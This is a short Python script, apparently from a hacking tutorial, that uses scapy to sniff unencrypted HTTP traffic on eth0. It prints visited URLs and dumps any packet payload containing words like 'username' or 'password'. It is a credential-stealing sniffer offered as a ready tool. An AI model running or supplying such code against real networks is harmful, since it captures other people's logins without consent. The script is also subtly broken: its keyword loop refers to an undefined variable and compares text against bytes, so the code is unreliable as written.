#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80")    #sniffing  HTTP packets

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):                                                      #checking for HTTP layer
        url=packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path                       #Host and Path fields are part of HTTP layer
        print(url)
        if packet.haslayer(scapy.Raw):
            load=packet[scapy.Raw].load
            keywords=["username", "user", "login", "pass", "password"]                          #checking for possible names
            for element in keywords:
                if keyword in load:
                    print(load)
                    break





sniff("eth0")
